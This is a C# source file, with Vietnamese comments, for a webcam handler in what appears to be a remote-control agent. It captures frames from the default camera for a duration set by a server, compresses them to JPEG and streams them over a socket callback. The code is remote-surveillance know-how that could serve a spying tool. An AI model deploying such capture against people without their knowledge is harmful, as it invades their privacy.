﻿using OpenCvSharp;
using System;
using System.Runtime.InteropServices;

namespace RemoteControl.Agent.Services.Media
{
    public class WebcamHandler
    {
        private bool _isCapturing = false;

        // Hàm này sẽ chạy async để không làm đơ ứng dụng
        // durationSeconds: Thời gian quay (do bạn quy định từ server)
        // onFrameCaptured: Hàm callback để gửi ảnh về SocketClient
        public async Task StartStreamingAsync(int durationSeconds, Func<byte[], Task> onFrameCaptured)
        {
            if (_isCapturing) return; // Đang quay thì không quay chồng
            _isCapturing = true;

            await Task.Run(async () =>
            {
                // Mở Camera số 0 (Camera mặc định)
                using var capture = new VideoCapture(0);
                if (!capture.IsOpened())
                {
                    _isCapturing = false;
                    return;
                }

                // Giảm độ phân giải để gửi qua mạng cho nhanh (nếu cần nét thì tăng lên)
                capture.Set(VideoCaptureProperties.FrameWidth, 640);
                capture.Set(VideoCaptureProperties.FrameHeight, 480);

                var endTime = DateTime.Now.AddSeconds(durationSeconds);
                using var frame = new Mat();

                while (DateTime.Now < endTime && _isCapturing)
                {
                    capture.Read(frame);
                    if (!frame.Empty())
                    {
                        // Nén ảnh sang JPEG
                        var buffer = frame.ImEncode(".jpg", new int[] { (int)ImwriteFlags.JpegQuality, 50 }); // Chất lượng 50%

                        // Gọi callback để gửi dữ liệu đi (gọi SocketClient)
                        if (buffer != null && buffer.Length > 0)
                        {
                            await onFrameCaptured(buffer);
                        }
                    }

                    // Giới hạn FPS (khoảng 10 hình/giây để đỡ lag mạng)
                    await Task.Delay(100);
                }

                _isCapturing = false;
            });
        }

        public void StopStreaming()
        {
            _isCapturing = false;
        }
    }
}